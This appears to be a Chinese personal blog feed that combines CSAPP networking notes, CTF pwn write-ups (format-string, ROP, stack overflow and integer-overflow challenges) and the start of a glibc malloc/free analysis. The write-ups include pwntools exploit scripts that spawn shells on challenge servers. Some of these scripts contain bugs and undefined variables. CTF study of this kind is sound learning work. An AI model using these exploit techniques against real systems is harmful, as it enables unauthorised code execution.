class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket .h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getnameinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, </span><br><span class="hljs-params">                <span class="hljs-type">socklen_t</span> salen,<span class="hljs-type">char</span> *host,</span><br><span class="hljs-params">                <span class="hljs-type">size_t</span> hostlen,<span class="hljs-type">char</span> *service, </span><br><span class="hljs-params">                <span class="hljs-type">size_t</span> servlen, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//返回;如果成功则为 0，如果错误则为非零的错误代码</span><br></code></pre></td></tr></table></figure><p>参数 sa 指向大小为 salen 字节的套接字地址结构，host 指向大小为 hostlen 字节的缓冲区，service 指向大小为 servlen 字节的缓冲区。</p><p>如果不想要主机名，可以把 <em>host</em> 设置为 NULL，hostlen 设置为 0。</p><p>参数 flags 是一个位掩码，能够修改默认的行为。同样可以把各种值用 OR 组合起来得到该掩码。</p><ul><li>NI_NUMERICHOST。getnameinfo 默认试图返回 host 中的域名。设置该标志会<br>使该函数返回一个数字地址字符串。</li><li>NI_NUMERICSERV。getnameinfo 默认会检查 &#x2F;etc&#x2F;services，如果可能，会返回服务名而不是端口号。设置该标志会使该函数跳过查找，简单地返回端口号。</li></ul><h1 id="Web-服务器"><a href="#Web-服务器" class="headerlink" title="Web 服务器"></a>Web 服务器</h1><h3 id="Web-基础"><a href="#Web-基础" class="headerlink" title="Web 基础"></a>Web 基础</h3><p>Web 客户端和服务器之间的交互用的是一个基于文本的应用级协议，叫做 HTTP（超文本传输协议）。</p><p>Web 内容可以用一种叫做 HTML（超文本标记语言）的语言来编写。</p><p>我之前有学过一点 HTML！<a href="%5Bhttps://shmodifier.github.io/2023/12/25/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/">这里！</a></p><h3 id="Web-内容"><a href="#Web-内容" class="headerlink" title="Web 内容"></a>Web 内容</h3><p>对于 Web 客户端和服务器而言，<strong>内容</strong>是与一个 <strong>MIME</strong>（Multipurpose Internet Mail Extensions，多用途的网际邮件扩充协议）类型相关的字节序列。</p><p>下表展示了一些常用的 MIME 类型。</p><table><thead><tr><th>MIME类型</th><th>描述</th></tr></thead><tbody><tr><td>text&#x2F;html</td><td>HTML 页面</td></tr><tr><td>text&#x2F;plain</td><td>无格式文本</td></tr><tr><td>application&#x2F;postscript</td><td>Postscript 文档</td></tr><tr><td>image&#x2F;gif</td><td>GIF 格式编码的二进制图像</td></tr><tr><td>image&#x2F;png</td><td>PNG 格式编码的二进制图像</td></tr><tr><td>image&#x2F;jpeg</td><td>JPEG 格式编码的二进制图像</td></tr></tbody></table><p>Web 服务器以两种不同的方式向客户端提供内容：</p><ul><li>取磁盘文件返回，并将它的内容返回给客户端。磁盘文件称为静态内容，而返回文件给客户端的过程称为服务静态内容。</li><li>运行一个可执行文件，并将它的输出返回给客户端。运行时可执行文件产生的输出称为动态内容，而运行程序并返回它的输出到客户端的过程称为服务动态内容。</li></ul><p>每条由 Web 服务器返回的内容都是和 URL（Universal Resource Locator，通用资源定位符）有关的。例如：</p><p>例如，<a href="http://www.google.com/index.html">http://www.google.com:80/index.html</a></p><p>把 URL 进行拆分其实能得到以下结构组成：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">protcol:<span class="hljs-regexp">//</span>host:port<span class="hljs-regexp">/router/</span>?arg1&amp;arg2<br></code></pre></td></tr></table></figure><ul><li>protcol：协议类型</li><li>host：主机地址</li><li>port：端口</li><li>router：路由</li><li>arg1&amp;arg2：url 参数</li></ul><h3 id="HTTP-事务"><a href="#HTTP-事务" class="headerlink" title="HTTP 事务"></a>HTTP 事务</h3><p>可以使用 TELNET 去连接一个 WEB 服务器，并发起请求。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-TELNET.png"></p><h4 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h4><p>个HTTP 请求的组成是这样的：一个<strong>请求行（request line）</strong>，后面跟随零个或更多个<strong>请求报头（request header）</strong>，再跟随一个空的文本行来终止报头列表。一个请求行的形式是 <strong>method URI version</strong>。</p><p>HTTP 支持许多不同的方法，包括 GET、POST、OPTIONS、HEAD、PUT、DELETE 和 TRACE。我们将只讨论广为应用的 GET 方法，大多数 HTTP 请求都是这种类型的。GET 方法指导服务器生成和返回 <strong>URI</strong>（Uniform Resource Identifier，统一资源标识符）标识的内容。URI 是相应的 URL 的后缀，包括文件名和可选的参数。</p><h4 id="HTTP-响应"><a href="#HTTP-响应" class="headerlink" title="HTTP 响应"></a>HTTP 响应</h4><p>HTTP 响应和 HTTP 请求是相似的。一个 HTTP 响应的组成是这样的：一个<strong>响应行</strong>（response line），后面跟随着零个或更多的<strong>响应报头</strong>（response header），再跟随一个终止报头的空行，再跟随一个<strong>响应主体</strong>（response body）。一个响应行的格式是 <strong>version status-code status-message</strong>。</p><p>version 字段描述的是响应所遵循的 HTTP 版本。<strong>状态码</strong>（status-code）是一个 3 位的正整数，指明对请求的处理。状态消息（status message）给出与错误代码等价的英文描述。下表列出了一些常见的状态码，以及它们相应的消息。</p><table><thead><tr><th>状态代码</th><th>状态消息</th><th>描述</th></tr></thead><tbody><tr><td>200</td><td>成功</td><td>处理请求无误</td></tr><tr><td>301</td><td>永久移动</td><td>内容已移动到 location 头中指明的主机上</td></tr><tr><td>400</td><td>错误请求</td><td>服务器不能理解请求</td></tr><tr><td>403</td><td>禁止</td><td>服务器无权访问所请求的文件</td></tr><tr><td>404</td><td>未发现</td><td>服务器不能找到所请求的文件</td></tr><tr><td>501</td><td>未实现</td><td>服务器不支持请求的方法</td></tr><tr><td>505</td><td>HTTP 版本不支持</td><td>服务器不支持请求的版本</td></tr></tbody></table><hr><p>又是一个节日，睡不卓又和小伙伴一起🥹</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%9D%A1%E4%B8%8D%E5%8D%93.jpg"></p><p>怪好笑的😅</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%88%98%E6%B3%A2.png"></p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>刷题进行中</title>
    <link href="/2023/12/18/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/"/>
    <url>/2023/12/18/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<p>持续更新</p><span id="more"></span><h1 id="强网"><a href="#强网" class="headerlink" title="强网"></a>强网</h1><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><blockquote><p>当时还做了一个 Misc 嘻嘻</p></blockquote><p>它最多输入 10byte 就是说</p><p>一开始我就疯狂手动尝试，发现输入九位字符的时候会被覆盖成 110000000，其他情况不管怎么输入都是九个零</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-28-32.png"></p><p>又尝试胡乱打了几下发现同是九位，输入 <code>asdf&#39;fdd</code> 就可以覆盖最高位的 0 了好神奇</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-47-30.png"></p><p>又又再次多次尝试发现最后一位是 d，对应的最后一位就是1。同时只要输入是九位，不管输入的前两位怎么变，覆盖率前两位都是11。</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_11-02-56.png"></p><p>所以说覆盖率后七位和输入的后七位一一对应。误打误撞知道最后一位是d，那我们只需要爆破一下中间的六位就行。</p><p>综上，我们只要保证一共输入九位，最后一位是d。只需要尝试枚举对应位值为0的位，对应位是1，那么就是已经找到了正确的值不需要改变了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br>io.remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12188</span>)<br><br>cover=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>payload=<span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;aaaaaaaad&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;bytes): &#x27;</span>)<br>i=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> i&gt;=<span class="hljs-built_in">len</span>(printable):<br>        i=i-<span class="hljs-built_in">len</span>(printable)<br>    ch=printable[i]<br>    j=cover.index(<span class="hljs-number">0</span>)<br>    payload[j]=<span class="hljs-built_in">ord</span>(ch)<br>    io.sendline(payload)<br>    io.recvuntil(<span class="hljs-string">b&#x27;coverage: &#x27;</span>)<br>    received_data = io.recvline().strip().decode()<br>cover = []<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> received_data:<br>    cover.append(<span class="hljs-built_in">int</span>(item))<br>    <span class="hljs-keyword">if</span> cover.count(<span class="hljs-string">&#x27;1&#x27;</span>)==<span class="hljs-number">9</span>:<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure><p>最后就暴力破解出来是 <code>xxqwbGood</code> 就可以让所有的位都是0。</p><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><blockquote><p>就会这一道（x</p></blockquote><p>没有 PIE 保护其他的都开了，进去一眼就是格式化字符串漏洞，但是原题目中的漏洞只能利用一次。</p><p>因为 64 位有前 6 位的寄存器传参所以 buf 是第 11 个参数。</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_main.png"></p><p>利用思路：</p><ul><li><p>首先需要劫持控制流让程序多次利用漏洞。</p></li><li><p>里面没有现成的后门函数可以利用，要手动构造 ROP gadget 。</p></li></ul><p>首先我们要考虑如何多次利用这个字符串漏洞。由于 read 的输入限制，我们没有办法通过溢出来改变 main 函数的返回地址。</p><p>在 gdb 中可以发现——rsp 指向 <code>buf-8</code> 的位置，也就是 read 的返回地址</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret.png"></p><p>当然在 printf 中也一样，<strong>栈上方是当前子函数的返回地址，栈的下方是整个 main 函数的返回地址。</strong></p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret2.png"></p><p>因为我们已知 buf 的地址，所以这样我们就能够让 printf 劫持自己的地址，从而回到 read 多次利用格式化字符串漏洞。</p><p>我们以控制 printf 函数返回到 csu_init 的 gadget 的位置，然后经过三次出栈操作，rsp 指向 <code>buf + 0x18</code>（每次 <code>pop</code> +8） ，执行 ret 。<code>buf + 0x18</code> 的值也是我们可控的，我们就可以修改它到执行 read 函数的地址。其中 0-0x18 中间的空隙我们用无意义的字符填充就好。</p><p>这样程序流程就变成了 <code>printf(buf) -&gt; gadget -&gt; read(0, buf,0x30)</code>。</p><p>因为 <code>printf(buf)</code> 的地址 <code>0x40122D</code> 和 csu_init 地址 <code>0x4012CE</code>仅有低字节不同，所以只需要修改低字节。</p><p>泄露地址和修改地址的操作可以同时完成。我们通过观察栈可以计算出 <code>__lic_start_call_main</code> 的偏移为  19</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_%E5%81%8F%E7%A7%BB.png"></p><p>接下来直接在 read 里构造 ROP 链就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&quot;./ez_fmt&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br>pop_rdi = <span class="hljs-number">0x04012d3</span><br>read_addr=<span class="hljs-number">0x0401205</span><br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>io.recvuntil(<span class="hljs-string">b&#x27;There is a gift for you &#x27;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(gift)<br><br>payload = <span class="hljs-string">&quot;%&#123;0xce&#125;c%10$hhn%19$p&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;A&#x27;</span>).encode()+p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>io.send(payload)<br>gdb.attch(io)<br>io.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>libc_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - (libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(libc_addr)<br><br>payload=flat(<br>    &#123;<br>        <span class="hljs-number">0x18</span>:p64(pop_rdi)+p64(libc_base+bin_sh)+p64(libc_base+system)<br>    &#125;<br>)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>学会了个语法用字典来填充字符串，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">flat<br>(<br>    &#123;<br>        <span class="hljs-number">0</span>:<span class="hljs-string">&quot;%&#123;&#125;c%11$hhn%19$p&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0xce</span>)<br>        <span class="hljs-number">0x18</span>:p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><p><code>flat()</code> 函数用于将多个变量打包成二进制格式的字符串，字典部分 <code>&#123;x:&quot;&quot;&#125;</code> ，意味从 偏移为 x 的地方开始填充键值对应的字符串，剩余部分用随机字符填充。</p><p>示例中的字典语句意为：从偏移为 0 的地方填充格式化字符串利用的字符，从偏移为 0x18 的地方开始填充两个地址数据，中间的部分用随机字符填充。最后由 <code>flat</code> 将他们打包成字符串。</p></blockquote><h1 id="FSCTF"><a href="#FSCTF" class="headerlink" title="FSCTF"></a>FSCTF</h1><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><code>tac fl* &gt;&amp;2</code></p><p>这个命令的作用如下：</p><ul><li><code>tac</code>：<code>tac</code> 命令用于颠倒文本文件中的行。它以相反的顺序打印文件的行。</li><li><code>fl*</code>：这是一个通配符模式，用于匹配当前目录中以 “fl” 开头的文件的名称。例如，它可能匹配文件如 “flag.txt” 或 “flag.dat”。</li><li><code>&gt;&amp;2</code>：命令的这部分将输出重定向到标准错误（文件描述符 2），而不是标准输出（文件描述符 1）。</li></ul><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/nc.png"></p><h3 id="rdi"><a href="#rdi" class="headerlink" title="rdi"></a>rdi</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_checksec.png"></p><p>没有 canary 保护和 PIE 保护</p><p>丢进 ida 看看</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_read.png"></p><p>info 里是程序的两行输入，接着就是这个 <code>read()</code> 函数，可以溢出。</p><p>另外就是 gift 函数了，里面有个 syscall 系统调用但是没有 “&#x2F;bin&#x2F;sh” 字符串，根据汇编代码推断出需要利用 rdi 传入参数</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_syscall.png"></p><p>因为开启了 NX 保护，我们不再直接向栈上注入 shellcode </p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_gadget.png"></p><p>顺便找一下 ‘&#x2F;bin&#x2F;sh’</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_sh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&#x27;./rdi&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28911</span>)<br><br>rdi=<span class="hljs-number">0x04007d3</span><br>bin_sh=<span class="hljs-number">0x040080d</span><br>syscall=<span class="hljs-number">0x04006FB</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br><span class="hljs-comment">#如果溢出长度够的话还可以通过泄露libc地址打</span><br><span class="hljs-comment">#payload=b&#x27;a&#x27;*0x88+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(main)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;ready for your answer:\n&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_checksec.png"></p><p>没有 canary 保护和 PIE 保护，再丢进 ida 看看</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_main.png"></p><p>main函数里有个 <code>read()</code> 函数，但是看上去没有溢出空间</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_func.png"></p><p><code>func()</code> 函数里有一个对输入的字符串 src 也就是 buf 的长度检测，由于这个函数的返回值是 <code>strcpy(s,src)</code>，我们不能使用 ‘\x00’ 来截断字符串。但这个记录 src 长度的 v3 是一个无符号的int型数据，可以通过整数溢出来绕过长度检测。</p><p>我们就需要知道 unsigned __int8 的取值范围是多少，是0<del>255，那我们可以输入字符的长度就可以是 256</del>264，在这范围内的长度都可以获得shell</p><p>然后就是这个后门函数了</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_syscall.png"></p><p>我们接着来计算 offest ，我们无法利用 main 函数中的返回地址，只能利用 func 中的 <code>return strcpy()</code>，s 的长度是 b9 ，覆盖返回地址就是 b9+4。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <br>p =remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28318</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./strstr&#x27;</span>)<br> <br>backdoor =<span class="hljs-number">0x80492AF</span><br>ret_addr =<span class="hljs-number">0x804900a</span><br> <br>p.recvuntil(<span class="hljs-string">b&#x27;show me your power\n&#x27;</span>)<br> <br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0xb9</span> +<span class="hljs-number">4</span>) +p32(backdoor)<br>payload=payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br> <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/stack_checksec.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>栈迁移</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc和free源码分析</title>
    <link href="/2023/12/17/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/12/17/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>libc2.23 的 malloc 和 free 函数源码分析</p><span id="more"></span><p>我们知道程序它有动态分配内存的操作，Linux 就是靠 malloc 和 free 来实现分配和回收的。</p><blockquote><p>不刻意去说明都是用 64 位系统举例解释的</p></blockquote><h1 id="ptmalloc2-的分配策略"><a href="#ptmalloc2-的分配策略" class="headerlink" title="ptmalloc2 的分配策略"></a>ptmalloc2 的分配策略</h1><blockquote><p>之前写堆概述的时候写过一次了这次粗略概括一下顺便复习了</p></blockquote><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>Linux系统中使用 ptmalloc2 ，在这个分配规则下，<strong>不是每一次 malloc 程序都会向系统申请内存。</strong></p><p>在第一次 <code>malloc()</code>的时候，它会向操作系统申请 <code>0x21000B(132KB)</code> 的内存（固定值不会变），后续分配都从已经申请的这一大块内存中分割，用完了才会再次向系统申请内存。</p><p>那么如何去分割块呢？我们实践时会发现，并不是我们希望获得多少内存程序就分割给我们多少的。每一个被分割的堆块都需要标注它们的信息，例如是否被使用、堆块大小等数据特征，这就导致分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。</p><p>同时由于需要保证指针对齐，系统要求每一个堆块都是 <code>SIZE_SZ*2</code> 的整倍数，也就是说 <strong>32 位操作系统下的堆块大小必须是 8 的整数倍，64 位必须是 16 的整数倍。</strong></p><p>以32位操作系统为例，size 的值必定为 8 的整数倍，二进制角度下看来，低三位永远是0，如果不利用起来的话就有点浪费。</p><p>如下图，在 malloc.c 中定义了下面的部分：</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E6%A0%87%E5%BF%97%E4%BD%8D%E4%B8%8Esize.png"></p><p>规定 <code>size</code> 的低三位不作为实际的 <code>chunk</code> 大小，而是标志位。三个标志位从高位到低位分别是：</p><ol><li><strong>NON_MAIN_ARENA</strong>：是否为主分配，0表示是主分配，权值为4</li><li><strong>IS_MMAPPED</strong>：表示内存是否为 <code>mmap</code> 获得，0表示不是，权值为2</li><li><strong>PREV_INUSE</strong>：表示前面一个内存块是否被使用，0表示不被使用，权值为1</li></ol><p>在 64 位操作系统中就是低 4 位，多出一个标志位，但是这个标志位当前无任何意义，但是它同样不作为 <code>chunk</code>的大小。</p><p>如果是单单满足 <code>SIZE_SZ*2</code> 的整倍数，那么理论上我们应该是可以分配 0x10 大小的堆块的，但是我们实际运行<code>malloc (0x10)</code> 发现堆块大小是 0x20，这是为什么呢？</p><p>接下来我们了解一下chunk结构就能知道，chunk 的结构体有 <code>0x10</code> 个默认被包含在堆块里的必须分配的字节。</p><h3 id="回收"><a href="#回收" class="headerlink" title="回收"></a>回收</h3><p>目前来看，分配堆块的时候实际上操作很简单，就是从大堆块里面分割一块合适的大小就好了。但是释放以后不能像捏橡皮泥一样再把它放回去。如果我们每一次 free 都不做处理的操作直接丢弃，例如我们一次性申请了很多小的堆块并释放，只有再下次申请同样堆块才会被利用，如果我们不再分配同样的小堆块，这块区域就会被浪费。</p><p>这时我们要了解一下 ptmalloc 的又一个策略：<strong>尽量合并物理相邻的空闲堆块</strong>。就是回收时，可以把相邻的小堆块合并成大堆块。在合并的时候我可能前面会有 <code>free</code> 的内存块，后面也会有 <code>free</code> 的内存块。</p><p>那么我怎么在只知道我自身信息的情况下准确找到前后的 <code>chunk</code> 具体在哪呢？</p><p>这时需要把 malloc_chunk 结构体拎上来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>通过 <code>prev_size</code> 位我们不仅可以得知前一个 <code>chunk</code> 有没有被 <code>free</code> ，还可以得知 <code>chunk</code> 的大小。所以在一个 <code>chunk</code> 的结构体内，在 size 之前还会有一个 <code>prev_size</code> 。</p><p>在程序使用时，<code>fd</code>、<code>bk</code> 等指针可以给用户写数据，只有被释放的时候才会存储指针数据。</p><p>所以 <code>prev_size</code> 和 <code>size</code> 两个数据就占了 0x10 的空间，这也就是最小堆块是 0x20 的原因。</p><h3 id="详细的回收处理"><a href="#详细的回收处理" class="headerlink" title="详细的回收处理"></a>详细的回收处理</h3><p>bin 就是空闲 chunk 的别名，我们使用链表结构来管理空闲堆块，我们说的 bin 也指代不同的链表表头。</p><h5 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast 